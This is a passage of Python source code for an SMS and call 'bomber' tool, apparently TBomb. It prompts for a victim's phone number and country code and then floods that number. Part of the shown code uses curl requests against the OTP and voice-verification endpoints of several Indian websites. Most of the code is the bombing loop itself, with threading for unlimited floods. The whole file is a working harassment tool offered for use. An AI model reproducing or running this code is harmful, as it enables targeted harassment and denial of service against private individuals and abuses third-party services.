"cookie:laquesis=pan-26381@a#pan-27752@b#pan-30043@b#pana-26381@b" -d \'{"type":"call","descriptor":"+91' + pn + '"}\' "https://www.olx.in/api/challenges" >/dev/null 2>&1')
        return True
    elif lim == 104:
        rd = os.popen('curl -s -X GET -H "Host:api.magicbricks.com" -H "Connection:keep-alive" -H "User-Agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.89 Safari/537.36" -H "Save-Data:on" -H "Accept:image/webp,image/apng,image/*,*/*;q=0.8" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6" "https://api.magicbricks.com/bricks/verifyOnCall.html?mobile=' + pn + '"').read().decode('utf-8')
        return rd.lower().strip().find('callmade') != -1
    elif lim == 106:
        rd = os.popen(
            'curl -s "https://www.myupchar.com/user_profile/resend_otp_via_voice?id=' + pn + '"').read()
        return rd.find("1") != -1
    return False


def remsp(num):
    num = num.replace(' ', '')
    num = num.replace('-', '')
    return num


def start(target, counter, delay, ch, cc):
    clr()
    banner()
    failed = 0
    requested = 0
    success = int(requested) - int(failed)
    bombs = int(counter) + 1
    while success < (int(bombs)):
        os.system('clear')
        banner()
        try:
            api = random.choice(ch)
        except Exception:
            if cc == "91":
                print('Sorry All APIs Have Expired Please Update TBomb')
                input('Press Enter To Exit...')
                exit()
            else:
                if success > 0:
                    print(
                        '\n\n\tWe Are Sorry To Say That Bombing Limit For Your Country Has Been Reached...')
                    print(
                        '\nWe Are Working Too Hard To Increase The International Limit...')
                    input(
                        '\nThis will help us to give support to your country fast...\n\nPress Enter To Exit...')
                    os.system('rm *.xxx* > /dev/null 2>&1')
                    print('\n\n')
                    banner()
                    exit()
                else:
                    print('\n\n\tSorry Your Country is Not Supported...')
                    print(
                        '\t\tPlease Send A Mail To ggspeedx29@gmail.com To Let Us Know...')
                    input('Press Enter To Exit...')
                    exit()
        print(random.choice(colors))
        print("==================================================================")
        print("                BOMBING in progress, please wait !!               ")
        print("     Please keep your data connection active during bombing !!    ")
        print("==================================================================")
        print("             Target Number           : +" + str(cc) + " ", target)
        print("             Number of Requests Sent : ", requested)
        print("             Successful Requests     : ", success)
        print("             Failed Requests         : ", failed)
        print("==================================================================")
        print("              Use this for fun, not for revenge !!                ")
        print("              This Bomber Was Created By SpeedX !!                ")
        print("==================================================================")
        try:
            result = getapi(target, api, cc)
        except Exception:
           result = False
        requested = requested + 1
        if result:
            success = success + 1
        else:
            failed = failed + 1
            while ch.count(api) > 0:
                ch.remove(api)
        time.sleep(float(delay))
        if requested % 3 == 0:
            checkinternet()
    print(W)
    print('\n\nBombing Completed..')
    os.system('rm *.xxx* > /dev/null 2>&1')
    banner()
    exit()


def update():
    if shutil.which('git'):
        os.system('git checkout . && git pull')
        print('\n\t\tUpdated Successfull !!!!')
        print('\tPlease Run The Script Again...')
    else:
        print("Please reclone TBomb Again")
    sys.exit()


clr()
banner()
try:
    urllib.request.urlopen('https://www.google.com')
except Exception:
    print("You are not connected To Internet!!!")
    print("\tPlease Connect To Internet To Continue...\n")
    input('Exiting....\n Press Enter To Continue....')
    exit()
print('\tChecking For Updates...')
ver = urllib.request.urlopen(
    "https://raw.githubusercontent.com/TheSpeedX/TBomb/master/.version").read().decode('utf-8')
verl = ''
try:
    verl = open(".version", 'r').read()
except Exception:
    pass
if ver != verl:
    print('\n\t\tAn Update is Available....')
    print('\tStarting Update...')
    update()
print("Your Version is Up-To-Date")
print('\n\n\t\t\tStarting TBomb...\n\n')
try:
    noti = urllib.request.urlopen(
        "https://raw.githubusercontent.com/TheSpeedX/TBomb/master/.notify").read().decode('utf-8')
    noti = noti.upper().strip()
    if len(noti) > 10:
        print('\n\n\tNOTIFICATION: ' + noti + '\n\n')
except Exception:
    pass
while True:
    pn = ""
    cc = input("\tEnter Your Country Code (Without +) : ")
    if '+' in cc:
        tc = list(cc)
        tc.remove('+')
        cc = ''.join(tc)
        cc = cc.strip()
    pn = input("\tEnter Target Number: +" + cc + " ")
    pn = remsp(pn)
    if len(cc) >= 4 or len(cc) < 1:
        print('\n\nInvalid Country Code..\n\t\tCountry Codes Are Generally 1-3 digits...\n')
        continue
    if len(pn) <= 6:
        print('\n\nInvalid Phone Number..\n')
        continue
    for cch in str(cc + pn):
        if not cch.isdigit():
            print('\n\nPhone Number Must Consist Of Numbers Only\n')
            continue
    break
type = 0
try:
    if sys.argv[1] == "call":
        type = 1
except Exception:
    type = 0
if type == 1:
    nm = int(input("Enter Number of Calls To Send(Maximum 15): "))
    if nm > 15:
        print("\t\tYou Have Entered " + str(nm) +
              ".\n\tNormalizing Value To 15")
        nm = 15
    dl = float(input("Enter Delay time (in seconds) [Recommended 10 sec ] : "))
elif type == 0:
    if cc == "91":
        nm = int(input("Enter Number of Messages To Send(0 For Unlimited): "))
        dl = float(
            input("Enter Delay time (in seconds) [Recommended 2 sec ] : "))
    else:
        nm = int(input("Enter Number of Messages To Send: "))
        dl = float(
            input("Enter Delay time (in seconds) [Recommended 10 sec ] : "))
maxlim = 0
if cc == "91":
    maxlim = 500
else:
    maxlim = 100
if nm > maxlim:
    print('\n\n\tSorry Due To Misuse Of This Script We Only Provide ' +
          str(maxlim) + ' SMS At Once...\n\n')
    print('Number Of SMS Has been Set To ' + str(maxlim))
    nm = maxlim
if not cc.strip() == "91":
    if type == 1:
        print(
            '\t\tSorry But Call Bombing is Currently Supported Only For Indian Numbers!!!!')
        print()
        input('Press Enter To Exit....')
        print('\n\n')
        banner()
        exit()
    cnt = 0
    if pn.strip() == '' or dl <= 0 or nm <= 0 or cc.strip() == '' or cc.find('+') != -1:
        print('\n\n\tSeems Like You Have Given Wrong Inputs...')
        input('\n\t\tPress Enter To Exit...')
        banner()
        exit()
    ch = [0, 14, 15, 16]
    start(pn, nm, dl, ch, str(cc))
    exit()
ch = [i for i in range(17)]
cbomb = False
if pn.strip() == '' or dl <= 0 or nm < 0:
    print('\n\n\tSeems Like You Have Given Wrong Inputs...')
    input('\n\t\tPress Enter To Exit...')
    banner()
    exit()
if type == 1:
    print("NOTE: Call Bomb Might Not Work on DND Activated Numbers...\n")
    print("\n\tPlease Don't Overload Call Bomb So That Is Would Work For Longer Period Of Time...")
    cbomb = True
if cbomb:
    chl = [100, 101, 102, 103, 104, 105, 106]
    start(pn, nm, dl, chl, str(cc))
    exit()
if nm == 0:
    nt = int(input("\tNumber Of Threads(10 to 20) : "))
    if nt <= 0 or nt >= 30:
        print('\tTBomb Shows Better Result in 10 to 25 Threads\n\t\tStill Continuing....')
    print("\n\nPlease Remember That This Is in Experimental Stage And Is Incredibly Fast...")
    t = [None] * nt
    print(random.choice(colors))
    print("\n\n==================================================================")
    print("                Gearing Up Bomber, please wait !!               ")
    print("     Please keep your data connection active during bombing !!    ")
    print("==================================================================")
    print("             Target Number       : +91", pn)
    print("             Number of Threads   : ", nt)
    print("             Delay               : ", dl)
    print("==================================================================")
    print("              Use this for fun, not for revenge !!                ")
    print("              This Bomber Was Created By SpeedX !!                ")
    print("==================================================================")
    print(W)
    input('\n\nPress CTRL+Z To STOP Bomber... \nPress Enter To Start Bomber...\n')
    os.system('rm *.xxx* > /dev/null 2>&1')
    print("\n\nStarting Bomb....")
    for i in range(nt):
        t[i] = threading.Thread(target=infinite, args=(pn, dl, ch, maxlim,))
        t[i].daemon = True
        t[i].start()
    time.sleep(2)
    ci = 0
    while True:
        ci += 1
        l = count_inf
        print("    Total Number of Requests Sent : ", l)
        if int(l) > maxlim:
            print('\n\n\tSorry Due To Misuse Of This Script We Only Provide ' +
                  str(maxlim) + ' SMS At Once...\n\n')
            input('Press Enter To Exit...')
            os.system('rm *xxx* > /dev/null 2>&1')
            banner()
            exit()
        time.sleep(1)
        if ci % 3 == 0:
            checkinternet()
else:
    start(pn, nm, dl, ch, '91')
    exit()
